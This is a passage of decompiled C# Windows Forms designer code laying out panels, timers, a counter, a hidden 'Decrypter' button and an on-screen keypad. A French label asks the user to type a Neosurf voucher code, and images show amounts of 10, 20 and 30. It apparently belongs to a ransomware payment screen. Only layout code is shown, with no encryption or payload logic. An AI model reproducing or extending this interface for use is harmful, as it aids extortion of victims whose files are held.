		tableLayoutPanel5 = new TableLayoutPanel();
		tableLayoutPanel6 = new TableLayoutPanel();
		label6 = new Label();
		label5 = new Label();
		pictureBox7 = new PictureBox();
		panel6 = new Panel();
		label7 = new Label();
		panel9 = new Panel();
		label10 = new Label();
		pictureBox8 = new PictureBox();
		counter = new Label();
		label12 = new Label();
		timer1 = new Timer(components);
		backgroundWorker1 = new BackgroundWorker();
		label14 = new Label();
		timer2 = new Timer(components);
		((Control)tableLayoutPanel1).SuspendLayout();
		((Control)tableLayoutPanel2).SuspendLayout();
		((Control)tableLayoutPanel3).SuspendLayout();
		((Control)panel4).SuspendLayout();
		((ISupportInitialize)pictureBox3).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)panel1).SuspendLayout();
		((Control)tableLayoutPanel4).SuspendLayout();
		((Control)panel2).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)panel5).SuspendLayout();
		((Control)tableLayoutPanel7).SuspendLayout();
		((Control)panel7).SuspendLayout();
		((Control)tableLayoutPanel8).SuspendLayout();
		((Control)tableLayoutPanel9).SuspendLayout();
		((ISupportInitialize)pictureBox6).BeginInit();
		((ISupportInitialize)pictureBox5).BeginInit();
		((ISupportInitialize)pictureBox4).BeginInit();
		((Control)panel8).SuspendLayout();
		((Control)keypad).SuspendLayout();
		((Control)panel3).SuspendLayout();
		((Control)tableLayoutPanel5).SuspendLayout();
		((Control)tableLayoutPanel6).SuspendLayout();
		((ISupportInitialize)pictureBox7).BeginInit();
		((Control)panel6).SuspendLayout();
		((Control)panel9).SuspendLayout();
		((ISupportInitialize)pictureBox8).BeginInit();
		((Control)this).SuspendLayout();
		tableLayoutPanel1.set_ColumnCount(2);
		tableLayoutPanel1.get_ColumnStyles().Add(new ColumnStyle((SizeType)1, 1000f));
		tableLayoutPanel1.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 100f));
		tableLayoutPanel1.get_Controls().Add((Control)(object)tableLayoutPanel2, 0, 3);
		tableLayoutPanel1.get_Controls().Add((Control)(object)panel3, 0, 2);
		tableLayoutPanel1.get_Controls().Add((Control)(object)tableLayoutPanel5, 0, 0);
		tableLayoutPanel1.get_Controls().Add((Control)(object)panel6, 0, 1);
		tableLayoutPanel1.get_Controls().Add((Control)(object)panel9, 1, 3);
		tableLayoutPanel1.get_Controls().Add((Control)(object)counter, 1, 2);
		tableLayoutPanel1.get_Controls().Add((Control)(object)label12, 1, 1);
		((Control)tableLayoutPanel1).set_Dock((DockStyle)5);
		((Control)tableLayoutPanel1).set_Location(new Point(0, 0));
		((Control)tableLayoutPanel1).set_Name("tableLayoutPanel1");
		tableLayoutPanel1.set_RowCount(4);
		tableLayoutPanel1.get_RowStyles().Add(new RowStyle((SizeType)1, 70f));
		tableLayoutPanel1.get_RowStyles().Add(new RowStyle((SizeType)1, 70f));
		tableLayoutPanel1.get_RowStyles().Add(new RowStyle((SizeType)1, 50f));
		tableLayoutPanel1.get_RowStyles().Add(new RowStyle());
		tableLayoutPanel1.get_RowStyles().Add(new RowStyle((SizeType)1, 20f));
		((Control)tableLayoutPanel1).set_Size(new Size(1311, 667));
		((Control)tableLayoutPanel1).set_TabIndex(0);
		tableLayoutPanel2.set_ColumnCount(2);
		tableLayoutPanel2.get_ColumnStyles().Add(new ColumnStyle((SizeType)1, 300f));
		tableLayoutPanel2.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 100f));
		tableLayoutPanel2.get_Controls().Add((Control)(object)tableLayoutPanel3, 0, 0);
		tableLayoutPanel2.get_Controls().Add((Control)(object)tableLayoutPanel4, 1, 0);
		((Control)tableLayoutPanel2).set_Dock((DockStyle)5);
		((Control)tableLayoutPanel2).set_Location(new Point(3, 193));
		((Control)tableLayoutPanel2).set_Name("tableLayoutPanel2");
		tableLayoutPanel2.set_RowCount(1);
		tableLayoutPanel2.get_RowStyles().Add(new RowStyle((SizeType)2, 100f));
		((Control)tableLayoutPanel2).set_Size(new Size(994, 471));
		((Control)tableLayoutPanel2).set_TabIndex(0);
		tableLayoutPanel3.set_ColumnCount(1);
		tableLayoutPanel3.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 100f));
		tableLayoutPanel3.get_ColumnStyles().Add(new ColumnStyle((SizeType)1, 20f));
		tableLayoutPanel3.get_Controls().Add((Control)(object)panel4, 0, 0);
		tableLayoutPanel3.get_Controls().Add((Control)(object)panel1, 0, 1);
		((Control)tableLayoutPanel3).set_Dock((DockStyle)5);
		((Control)tableLayoutPanel3).set_Location(new Point(3, 3));
		((Control)tableLayoutPanel3).set_Name("tableLayoutPanel3");
		((Control)tableLayoutPanel3).set_Padding(new Padding(10));
		tableLayoutPanel3.set_RowCount(2);
		tableLayoutPanel3.get_RowStyles().Add(new RowStyle((SizeType)2, 80f));
		tableLayoutPanel3.get_RowStyles().Add(new RowStyle((SizeType)2, 20f));
		((Control)tableLayoutPanel3).set_Size(new Size(294, 465));
		((Control)tableLayoutPanel3).set_TabIndex(0);
		((Control)panel4).set_Anchor((AnchorStyles)15);
		((Control)panel4).set_BackColor(Color.FromArgb(37, 37, 37));
		((Control)panel4).get_Controls().Add((Control)(object)label4);
		((Control)panel4).get_Controls().Add((Control)(object)pictureBox3);
		((Control)panel4).get_Controls().Add((Control)(object)pictureBox2);
		((Control)panel4).set_Location(new Point(13, 13));
		((Control)panel4).set_Name("panel4");
		((Control)panel4).set_Size(new Size(268, 350));
		((Control)panel4).set_TabIndex(1);
		((Control)label4).set_Anchor((AnchorStyles)15);
		label4.set_AutoEllipsis(true);
		((Control)label4).set_BackColor(Color.Transparent);
		((Control)label4).set_Font(new Font("Tahoma", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.White);
		((Control)label4).set_Location(new Point(6, 6));
		((Control)label4).set_Margin(new Padding(6));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(254, 338));
		((Control)label4).set_TabIndex(0);
		((Control)label4).set_Text(componentResourceManager.GetString("label4.Text"));
		((Control)pictureBox3).set_Anchor((AnchorStyles)6);
		((Control)pictureBox3).set_BackgroundImage((Image)(object)Resources.bottom_left);
		((Control)pictureBox3).set_BackgroundImageLayout((ImageLayout)4);
		((Control)pictureBox3).set_Location(new Point(0, 313));
		((Control)pictureBox3).set_Name("pictureBox3");
		((Control)pictureBox3).set_Size(new Size(35, 35));
		pictureBox3.set_TabIndex(3);
		pictureBox3.set_TabStop(false);
		((Control)pictureBox2).set_Anchor((AnchorStyles)10);
		((Control)pictureBox2).set_BackgroundImage((Image)(object)Resources.bottom_right);
		((Control)pictureBox2).set_BackgroundImageLayout((ImageLayout)4);
		((Control)pictureBox2).set_Location(new Point(231, 313));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(35, 35));
		pictureBox2.set_TabIndex(2);
		pictureBox2.set_TabStop(false);
		((Control)panel1).set_Anchor((AnchorStyles)15);
		((Control)panel1).set_BackColor(Color.FromArgb(37, 37, 37));
		((Control)panel1).get_Controls().Add((Control)(object)label14);
		((Control)panel1).get_Controls().Add((Control)(object)label1);
		((Control)panel1).set_Location(new Point(13, 369));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(268, 83));
		((Control)panel1).set_TabIndex(0);
		label1.set_AutoEllipsis(true);
		((Control)label1).set_BackColor(Color.Transparent);
		((Control)label1).set_Font(new Font("Tahoma", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(6, 6));
		((Control)label1).set_Margin(new Padding(6));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(254, 47));
		((Control)label1).set_TabIndex(0);
		tableLayoutPanel4.set_ColumnCount(1);
		tableLayoutPanel4.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 100f));
		tableLayoutPanel4.get_ColumnStyles().Add(new ColumnStyle((SizeType)1, 20f));
		tableLayoutPanel4.get_Controls().Add((Control)(object)panel2, 0, 1);
		tableLayoutPanel4.get_Controls().Add((Control)(object)panel5, 0, 0);
		((Control)tableLayoutPanel4).set_Dock((DockStyle)5);
		((Control)tableLayoutPanel4).set_Location(new Point(303, 3));
		((Control)tableLayoutPanel4).set_Name("tableLayoutPanel4");
		((Control)tableLayoutPanel4).set_Padding(new Padding(10));
		tableLayoutPanel4.set_RowCount(2);
		tableLayoutPanel4.get_RowStyles().Add(new RowStyle((SizeType)2, 90f));
		tableLayoutPanel4.get_RowStyles().Add(new RowStyle((SizeType)2, 10f));
		((Control)tableLayoutPanel4).set_Size(new Size(688, 465));
		((Control)tableLayoutPanel4).set_TabIndex(1);
		((Control)panel2).set_Anchor((AnchorStyles)15);
		((Control)panel2).set_BackColor(Color.FromArgb(37, 37, 37));
		((Control)panel2).get_Controls().Add((Control)(object)label13);
		((Control)panel2).get_Controls().Add((Control)(object)label2);
		((Control)panel2).get_Controls().Add((Control)(object)pictureBox1);
		((Control)panel2).set_Location(new Point(13, 413));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(662, 39));
		((Control)panel2).set_TabIndex(1);
		label13.set_AutoEllipsis(true);
		((Control)label13).set_BackColor(Color.Transparent);
		((Control)label13).set_Font(new Font("Tahoma", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label13).set_ForeColor(Color.Red);
		((Control)label13).set_Location(new Point(-1, 12));
		((Control)label13).set_Margin(new Padding(6));
		((Control)label13).set_Name("label13");
		((Control)label13).set_Size(new Size(669, 16));
		((Control)label13).set_TabIndex(47);
		((Control)label13).set_Text("N.B : Utiliser le Clavier sur le logiciel Pour taper le Code Neosurf et le button Couriger pour modifer le code");
		label2.set_AutoEllipsis(true);
		((Control)label2).set_BackColor(Color.Transparent);
		((Control)label2).set_Font(new Font("Tahoma", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(6, 6));
		((Control)label2).set_Margin(new Padding(6));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(642, 26));
		((Control)label2).set_TabIndex(0);
		((Control)label2).set_Text("\r\n");
		((Control)pictureBox1).set_Anchor((AnchorStyles)10);
		((Control)pictureBox1).set_BackgroundImage((Image)(object)Resources.bottom_right);
		((Control)pictureBox1).set_BackgroundImageLayout((ImageLayout)4);
		((Control)pictureBox1).set_Location(new Point(2432, -3));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(44, 41));
		pictureBox1.set_TabIndex(1);
		pictureBox1.set_TabStop(false);
		((Control)panel5).get_Controls().Add((Control)(object)tableLayoutPanel7);
		((Control)panel5).set_Dock((DockStyle)5);
		((Control)panel5).set_Location(new Point(13, 13));
		((Control)panel5).set_Name("panel5");
		((Control)panel5).set_Size(new Size(662, 394));
		((Control)panel5).set_TabIndex(2);
		tableLayoutPanel7.set_ColumnCount(1);
		tableLayoutPanel7.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 100f));
		tableLayoutPanel7.get_ColumnStyles().Add(new ColumnStyle((SizeType)1, 20f));
		tableLayoutPanel7.get_Controls().Add((Control)(object)panel7, 0, 0);
		tableLayoutPanel7.get_Controls().Add((Control)(object)tableLayoutPanel8, 0, 1);
		((Control)tableLayoutPanel7).set_Dock((DockStyle)5);
		((Control)tableLayoutPanel7).set_Location(new Point(0, 0));
		((Control)tableLayoutPanel7).set_Name("tableLayoutPanel7");
		tableLayoutPanel7.set_RowCount(2);
		tableLayoutPanel7.get_RowStyles().Add(new RowStyle((SizeType)1, 60f));
		tableLayoutPanel7.get_RowStyles().Add(new RowStyle((SizeType)2, 100f));
		((Control)tableLayoutPanel7).set_Size(new Size(662, 394));
		((Control)tableLayoutPanel7).set_TabIndex(0);
		((Control)panel7).set_Anchor((AnchorStyles)15);
		((Control)panel7).set_BackColor(Color.FromArgb(37, 37, 37));
		((Control)panel7).get_Controls().Add((Control)(object)label8);
		((Control)panel7).set_Location(new Point(3, 3));
		((Control)panel7).set_Name("panel7");
		((Control)panel7).set_Size(new Size(656, 54));
		((Control)panel7).set_TabIndex(2);
		((Control)label8).set_Anchor((AnchorStyles)15);
		label8.set_AutoEllipsis(true);
		((Control)label8).set_BackColor(Color.Transparent);
		((Control)label8).set_Font(new Font("Segoe UI", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_ForeColor(Color.FromArgb(255, 128, 0));
		((Control)label8).set_Location(new Point(9, -4));
		((Control)label8).set_Margin(new Padding(6));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(641, 58));
		((Control)label8).set_TabIndex(0);
		((Control)label8).set_Text(componentResourceManager.GetString("label8.Text"));
		label8.set_TextAlign((ContentAlignment)32);
		tableLayoutPanel8.set_ColumnCount(1);
		tableLayoutPanel8.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 100f));
		tableLayoutPanel8.get_Controls().Add((Control)(object)tableLayoutPanel9, 0, 0);
		tableLayoutPanel8.get_Controls().Add((Control)(object)panel8, 0, 1);
		((Control)tableLayoutPanel8).set_Dock((DockStyle)5);
		((Control)tableLayoutPanel8).set_Location(new Point(3, 63));
		((Control)tableLayoutPanel8).set_Name("tableLayoutPanel8");
		tableLayoutPanel8.set_RowCount(2);
		tableLayoutPanel8.get_RowStyles().Add(new RowStyle((SizeType)1, 110f));
		tableLayoutPanel8.get_RowStyles().Add(new RowStyle((SizeType)2, 100f));
		((Control)tableLayoutPanel8).set_Size(new Size(656, 328));
		((Control)tableLayoutPanel8).set_TabIndex(0);
		((Control)tableLayoutPanel9).set_BackColor(Color.White);
		tableLayoutPanel9.set_ColumnCount(3);
		tableLayoutPanel9.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 33.33333f));
		tableLayoutPanel9.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 33.33333f));
		tableLayoutPanel9.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 33.33333f));
		tableLayoutPanel9.get_Controls().Add((Control)(object)pictureBox6, 0, 0);
		tableLayoutPanel9.get_Controls().Add((Control)(object)pictureBox5, 0, 0);
		tableLayoutPanel9.get_Controls().Add((Control)(object)pictureBox4, 0, 0);
		((Control)tableLayoutPanel9).set_Dock((DockStyle)5);
		((Control)tableLayoutPanel9).set_Location(new Point(3, 3));
		((Control)tableLayoutPanel9).set_Name("tableLayoutPanel9");
		tableLayoutPanel9.set_RowCount(1);
		tableLayoutPanel9.get_RowStyles().Add(new RowStyle((SizeType)2, 100f));
		tableLayoutPanel9.get_RowStyles().Add(new RowStyle((SizeType)1, 104f));
		((Control)tableLayoutPanel9).set_Size(new Size(650, 104));
		((Control)tableLayoutPanel9).set_TabIndex(0);
		((Control)pictureBox6).set_BackgroundImage((Image)(object)Resources._30);
		((Control)pictureBox6).set_BackgroundImageLayout((ImageLayout)4);
		((Control)pictureBox6).set_Location(new Point(435, 3));
		((Control)pictureBox6).set_Name("pictureBox6");
		((Control)pictureBox6).set_Size(new Size(193, 91));
		pictureBox6.set_TabIndex(3);
		pictureBox6.set_TabStop(false);
		((Control)pictureBox5).set_BackgroundImage((Image)(object)Resources._20);
		((Control)pictureBox5).set_BackgroundImageLayout((ImageLayout)4);
		((Control)pictureBox5).set_Location(new Point(219, 3));
		((Control)pictureBox5).set_Name("pictureBox5");
		((Control)pictureBox5).set_Size(new Size(192, 91));
		pictureBox5.set_TabIndex(2);
		pictureBox5.set_TabStop(false);
		((Control)pictureBox4).set_BackgroundImage((Image)(object)Resources._10);
		((Control)pictureBox4).set_BackgroundImageLayout((ImageLayout)4);
		((Control)pictureBox4).set_Location(new Point(3, 3));
		((Control)pictureBox4).set_Name("pictureBox4");
		((Control)pictureBox4).set_Size(new Size(192, 91));
		pictureBox4.set_TabIndex(1);
		pictureBox4.set_TabStop(false);
		((Control)panel8).get_Controls().Add((Control)(object)button39);
		((Control)panel8).get_Controls().Add((Control)(object)textBox4);
		((Control)panel8).get_Controls().Add((Control)(object)textBox3);
		((Control)panel8).get_Controls().Add((Control)(object)textBox2);
		((Control)panel8).get_Controls().Add((Control)(object)keypad);
		((Control)panel8).get_Controls().Add((Control)(object)button38);
		((Control)panel8).get_Controls().Add((Control)(object)button1);
		((Control)panel8).get_Controls().Add((Control)(object)textBox1);
		((Control)panel8).get_Controls().Add((Control)(object)label9);
		((Control)panel8).get_Controls().Add((Control)(object)label11);
		((Control)panel8).set_Location(new Point(3, 113));
		((Control)panel8).set_Name("panel8");
		((Control)panel8).set_Size(new Size(650, 212));
		((Control)panel8).set_TabIndex(1);
		((Control)button39).set_Location(new Point(531, 109));
		((Control)button39).set_Name("button39");
		((Control)button39).set_Size(new Size(101, 53));
		((Control)button39).set_TabIndex(47);
		((Control)button39).set_Text("Decrypter");
		((ButtonBase)button39).set_UseVisualStyleBackColor(true);
		((Control)button39).set_Visible(false);
		((Control)button39).add_Click((EventHandler)button39_Click);
		((Control)textBox4).set_Location(new Point(228, 30));
		((TextBoxBase)textBox4).set_MaxLength(200);
		((Control)textBox4).set_Name("textBox4");
		((Control)textBox4).set_Size(new Size(280, 20));
		((Control)textBox4).set_TabIndex(45);
		((Control)textBox3).set_Location(new Point(429, 4));
		((TextBoxBase)textBox3).set_MaxLength(3);
		((Control)textBox3).set_Name("textBox3");
		((TextBoxBase)textBox3).set_ReadOnly(true);
		((Control)textBox3).set_Size(new Size(79, 20));
		((Control)textBox3).set_TabIndex(43);
		((Control)textBox2).set_Location(new Point(332, 4));
		((TextBoxBase)textBox2).set_MaxLength(3);
		((Control)textBox2).set_Name("textBox2");
		((TextBoxBase)textBox2).set_ReadOnly(true);
		((Control)textBox2).set_Size(new Size(79, 20));
		((Control)textBox2).set_TabIndex(42);
		((Control)keypad).set_BackColor(Color.FromArgb(37, 37, 37));
		((Control)keypad).get_Controls().Add((Control)(object)button2);
		((Control)keypad).get_Controls().Add((Control)(object)button5);
		((Control)keypad).get_Controls().Add((Control)(object)button32);
		((Control)keypad).get_Controls().Add((Control)(object)button6);
		((Control)keypad).get_Controls().Add((Control)(object)button33);
		((Control)keypad).get_Controls().Add((Control)(object)button7);
		((Control)keypad).get_Controls().Add((Control)(object)button34);
		((Control)keypad).get_Controls().Add((Control)(object)button8);
		((Control)keypad).get_Controls().Add((Control)(object)button35);
		((Control)keypad).get_Controls().Add((Control)(object)button9);
		((Control)keypad).get_Controls().Add((Control)(object)button36);
		((Control)keypad).get_Controls().Add((Control)(object)button10);
		((Control)keypad).get_Controls().Add((Control)(object)button37);
		((Control)keypad).get_Controls().Add((Control)(object)button11);
		((Control)keypad).get_Controls().Add((Control)(object)button22);
		((Control)keypad).get_Controls().Add((Control)(object)button12);
		((Control)keypad).get_Controls().Add((Control)(object)button23);
		((Control)keypad).get_Controls().Add((Control)(object)button13);
		((Control)keypad).get_Controls().Add((Control)(object)button24);
		((Control)keypad).get_Controls().Add((Control)(object)button21);
		((Control)keypad).get_Controls().Add((Control)(object)button25);
		((Control)keypad).get_Controls().Add((Control)(object)button20);
		((Control)keypad).get_Controls().Add((Control)(object)button26);
		((Control)keypad).get_Controls().Add((Control)(object)button19);
		((Control)keypad).get_Controls().Add((Control)(object)button27);
		((Control)keypad).get_Controls().Add((Control)(object)button18);
		((Control)keypad).get_Controls().Add((Control)(object)button28);
		((Control)keypad).get_Controls().Add((Control)(object)button17);
		((Control)keypad).get_Controls().Add((Control)(object)button29);
		((Control)keypad).get_Controls().Add((Control)(object)button16);
		((Control)keypad).get_Controls().Add((Control)(object)button30);
		((Control)keypad).get_Controls().Add((Control)(object)button15);
		((Control)keypad).get_Controls().Add((Control)(object)button31);
		((Control)keypad).get_Controls().Add((Control)(object)button14);
		((Control)keypad).get_Controls().Add((Control)(object)button3);
		((Control)keypad).get_Controls().Add((Control)(object)button4);
		((Control)keypad).set_Location(new Point(223, 56));
		((Control)keypad).set_Name("keypad");
		((Control)keypad).set_Size(new Size(297, 148));
		((Control)keypad).set_TabIndex(41);
		((Control)button2).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button2).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button2).set_Location(new Point(6, 13));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(23, 23));
		((Control)button2).set_TabIndex(2);
		((Control)button2).set_Text("0");
		((ButtonBase)button2).set_UseVisualStyleBackColor(false);
		((Control)button5).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button5).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button5).set_Location(new Point(267, 13));
		((Control)button5).set_Name("button5");
		((Control)button5).set_Size(new Size(23, 23));
		((Control)button5).set_TabIndex(5);
		((Control)button5).set_Text("9");
		((ButtonBase)button5).set_UseVisualStyleBackColor(false);
		((Control)button32).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button32).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button32).set_Location(new Point(64, 118));
		((Control)button32).set_Name("button32");
		((Control)button32).set_Size(new Size(23, 23));
		((Control)button32).set_TabIndex(39);
		((Control)button32).set_Text("W");
		((ButtonBase)button32).set_UseVisualStyleBackColor(false);
		((Control)button6).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button6).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button6).set_Location(new Point(238, 13));
		((Control)button6).set_Name("button6");
		((Control)button6).set_Size(new Size(23, 23));
		((Control)button6).set_TabIndex(6);
		((Control)button6).set_Text("8");
		((ButtonBase)button6).set_UseVisualStyleBackColor(false);
		((Control)button33).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button33).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button33).set_Location(new Point(93, 118));
		((Control)button33).set_Name("button33");
		((Control)button33).set_Size(new Size(23, 23));
		((Control)button33).set_TabIndex(38);
		((Control)button33).set_Text("X");
		((ButtonBase)button33).set_UseVisualStyleBackColor(false);
		((Control)button7).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button7).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button7).set_Location(new Point(209, 13));
		((Control)button7).set_Name("button7");
		((Control)button7).set_Size(new Size(23, 23));
		((Control)button7).set_TabIndex(7);
		((Control)button7).set_Text("7");
		((ButtonBase)button7).set_UseVisualStyleBackColor(false);
		((Control)button34).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button34).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button34).set_Location(new Point(122, 118));
		((Control)button34).set_Name("button34");
		((Control)button34).set_Size(new Size(23, 23));
		((Control)button34).set_TabIndex(37);
		((Control)button34).set_Text("C");
		((ButtonBase)button34).set_UseVisualStyleBackColor(false);
		((Control)button8).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button8).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button8).set_Location(new Point(180, 13));
		((Control)button8).set_Name("button8");
		((Control)button8).set_Size(new Size(23, 23));
		((Control)button8).set_TabIndex(8);
		((Control)button8).set_Text("6");
		((ButtonBase)button8).set_UseVisualStyleBackColor(false);
		((Control)button35).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button35).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button35).set_Location(new Point(151, 118));
		((Control)button35).set_Name("button35");
		((Control)button35).set_Size(new Size(23, 23));
		((Control)button35).set_TabIndex(36);
		((Control)button35).set_Text("V");
		((ButtonBase)button35).set_UseVisualStyleBackColor(false);
		((Control)button9).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button9).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button9).set_Location(new Point(151, 13));
		((Control)button9).set_Name("button9");
		((Control)button9).set_Size(new Size(23, 23));
		((Control)button9).set_TabIndex(9);
		((Control)button9).set_Text("5");
		((ButtonBase)button9).set_UseVisualStyleBackColor(false);
		((Control)button36).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button36).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button36).set_Location(new Point(180, 118));
		((Control)button36).set_Name("button36");
		((Control)button36).set_Size(new Size(23, 23));
		((Control)button36).set_TabIndex(35);
		((Control)button36).set_Text("B");
		((ButtonBase)button36).set_UseVisualStyleBackColor(false);
		((Control)button10).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button10).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button10).set_Location(new Point(122, 13));
		((Control)button10).set_Name("button10");
		((Control)button10).set_Size(new Size(23, 23));
		((Control)button10).set_TabIndex(10);
		((Control)button10).set_Text("4");
		((ButtonBase)button10).set_UseVisualStyleBackColor(false);
		((Control)button37).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button37).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button37).set_Location(new Point(209, 118));
		((Control)button37).set_Name("button37");
		((Control)button37).set_Size(new Size(23, 23));
		((Control)button37).set_TabIndex(34);
		((Control)button37).set_Text("N");
		((ButtonBase)button37).set_UseVisualStyleBackColor(false);
		((Control)button11).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button11).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button11).set_Location(new Point(93, 13));
		((Control)button11).set_Name("button11");
		((Control)button11).set_Size(new Size(23, 23));
		((Control)button11).set_TabIndex(11);
		((Control)button11).set_Text("3");
		((ButtonBase)button11).set_UseVisualStyleBackColor(false);
		((Control)button22).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button22).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button22).set_Location(new Point(35, 89));
		((Control)button22).set_Name("button22");
		((Control)button22).set_Size(new Size(23, 23));
		((Control)button22).set_TabIndex(33);
		((Control)button22).set_Text("S");
		((ButtonBase)button22).set_UseVisualStyleBackColor(false);
		((Control)button12).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button12).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button12).set_Location(new Point(64, 13));
		((Control)button12).set_Name("button12");
		((Control)button12).set_Size(new Size(23, 23));
		((Control)button12).set_TabIndex(12);
		((Control)button12).set_Text("2");
		((ButtonBase)button12).set_UseVisualStyleBackColor(false);
		((Control)button23).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button23).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button23).set_Location(new Point(64, 89));
		((Control)button23).set_Name("button23");
		((Control)button23).set_Size(new Size(23, 23));
		((Control)button23).set_TabIndex(32);
		((Control)button23).set_Text("D");
		((ButtonBase)button23).set_UseVisualStyleBackColor(false);
		((Control)button13).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button13).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button13).set_Location(new Point(35, 13));
		((Control)button13).set_Name("button13");
		((Control)button13).set_Size(new Size(23, 23));
		((Control)button13).set_TabIndex(13);
		((Control)button13).set_Text("1");
		((ButtonBase)button13).set_UseVisualStyleBackColor(false);
		((Control)button24).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button24).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button24).set_Location(new Point(93, 89));
		((Control)button24).set_Name("button24");
		((Control)button24).set_Size(new Size(23, 23));
		((Control)button24).set_TabIndex(31);
		((Control)button24).set_Text("F");
		((ButtonBase)button24).set_UseVisualStyleBackColor(false);
		((Control)button21).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button21).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button21).set_Location(new Point(6, 60));
		((Control)button21).set_Name("button21");
		((Control)button21).set_Size(new Size(23, 23));
		((Control)button21).set_TabIndex(14);
		((Control)button21).set_Text("A");
		((ButtonBase)button21).set_UseVisualStyleBackColor(false);
		((Control)button25).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button25).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button25).set_Location(new Point(122, 89));
		((Control)button25).set_Name("button25");
		((Control)button25).set_Size(new Size(23, 23));
		((Control)button25).set_TabIndex(30);
		((Control)button25).set_Text("G");
		((ButtonBase)button25).set_UseVisualStyleBackColor(false);
		((Control)button20).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button20).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button20).set_Location(new Point(267, 60));
		((Control)button20).set_Name("button20");
		((Control)button20).set_Size(new Size(23, 23));
		((Control)button20).set_TabIndex(15);
		((Control)button20).set_Text("P");
		((ButtonBase)button20).set_UseVisualStyleBackColor(false);
		((Control)button26).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button26).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button26).set_Location(new Point(151, 89));
		((Control)button26).set_Name("button26");
		((Control)button26).set_Size(new Size(23, 23));
		((Control)button26).set_TabIndex(29);
		((Control)button26).set_Text("H");
		((ButtonBase)button26).set_UseVisualStyleBackColor(false);
		((Control)button19).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button19).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button19).set_Location(new Point(238, 60));
		((Control)button19).set_Name("button19");
		((Control)button19).set_Size(new Size(23, 23));
		((Control)button19).set_TabIndex(16);
		((Control)button19).set_Text("O");
		((ButtonBase)button19).set_UseVisualStyleBackColor(false);
		((Control)button27).set_BackColor(Color.FromArgb(255, 255, 192));
		((Control)button27).set_ForeColor(Color.FromArgb(9, 136, 60));
		((Control)button27).set_Location(new Point(180, 89));
		((Control)button27).set_Name("button27");
		((Control)button27).set_Size(new Size(23, 23));
		((Control)button27).set_TabIndex(28);
		((Control)button27).set_Text("J");
